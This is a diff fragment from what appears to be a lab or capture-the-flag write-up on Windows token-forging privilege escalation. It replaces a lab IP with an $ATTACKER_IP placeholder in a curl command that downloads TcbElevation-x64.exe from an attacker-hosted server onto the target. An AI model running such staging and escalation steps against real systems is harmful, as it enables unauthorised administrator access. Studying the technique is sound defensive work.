@@ -18,7 +18,7 @@ So you mint a brand-new token that says "tom — member of: Users **and Administ
 1. **Upload the tool** to the target:
 
 ```powershell
-   curl http://10.10.14.139:8000/TcbElevation-x64.exe -o TcbElevation-x64.exe
+   curl http://$ATTACKER_IP:8000/TcbElevation-x64.exe -o TcbElevation-x64.exe
 ```
 
 2. **Run a command inside a forged admin token:**
